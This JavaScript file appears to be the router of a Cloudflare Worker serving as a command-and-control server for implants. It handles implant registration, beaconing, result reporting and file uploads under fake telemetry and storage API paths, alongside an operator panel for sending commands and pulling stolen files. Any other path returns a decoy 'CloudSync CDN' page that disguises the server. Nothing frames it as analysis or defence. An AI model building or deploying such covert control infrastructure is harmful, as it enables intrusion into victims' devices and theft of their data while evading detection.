import { handleRegister, handleBeacon, handleResult, handleUpload } from './routes/implant.js';
import {
  handleLoginPage, handleLoginPost, handleLogout,
  handleDashboard, handleDevicePage,
  handleApiDevices, handleApiDevice, handleApiCmd,
  handleApiResults, handleApiFile, handleSetup
} from './routes/panel.js';

export { DeviceSession } from './do/device.js';

const DECOY = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>CloudSync CDN</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>html,body{margin:0;height:100%;background:#0b0d10;color:#8892a0;
font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center}
.box{text-align:center}h1{font-weight:300;font-size:1.6rem;color:#c9d1d9;letter-spacing:.08em}
p{color:#5b6673;font-size:.85rem;letter-spacing:.15em;text-transform:uppercase}</style>
</head><body><div class="box"><h1>CloudSync CDN</h1>
<p>Edge delivery • All systems operational</p></div></body></html>`;

export default {
  async fetch(req, env, ctx) {
    const url = new URL(req.url);
    const p = url.pathname;
    const m = req.method;

    try {
      if (p === '/api/v2/device/register' && m === 'POST') return handleRegister(req, env);
      if (p === '/api/v2/telemetry/ping' && m === 'POST') return handleBeacon(req, env);
      if (p === '/api/v2/telemetry/report' && m === 'POST') return handleResult(req, env);
      if (p === '/api/v2/storage/upload' && m === 'POST') return handleUpload(req, env);

      if (p === '/setup' && m === 'POST') return handleSetup(req, env);

      if (p === '/login' && m === 'GET')  return handleLoginPage(req, env);
      if (p === '/login' && m === 'POST') return handleLoginPost(req, env);
      if (p === '/logout')                return handleLogout(req, env);
      if (p === '/panel' && m === 'GET')  return handleDashboard(req, env);
      if (p.startsWith('/device/') && m === 'GET') return handleDevicePage(req, env);

      if (p === '/api/op/devices' && m === 'GET') return handleApiDevices(req, env);
      if (p.startsWith('/api/op/device/') && m === 'GET') {
        const id = p.replace('/api/op/device/', '');
        return handleApiDevice(req, env, id);
      }
      if (p === '/api/op/cmd' && m === 'POST')     return handleApiCmd(req, env);
      if (p === '/api/op/results' && m === 'GET')  return handleApiResults(req, env);
      if (p.startsWith('/api/op/file/') && m === 'GET') return handleApiFile(req, env);

      if (p.startsWith('/ws/device/')) {
        const id = p.replace('/ws/device/', '');
        const stub = env.DEVICE.get(env.DEVICE.idFromName(id));
        return stub.fetch('https://do/ws', req);
      }

      return new Response(DECOY, {
        headers: { 'content-type': 'text/html; charset=utf-8' }
      });
    } catch (e) {
      return new Response(JSON.stringify({ error: e.message }), {
        status: 500,
        headers: { 'content-type': 'application/json' }
      });
    }
  }
};
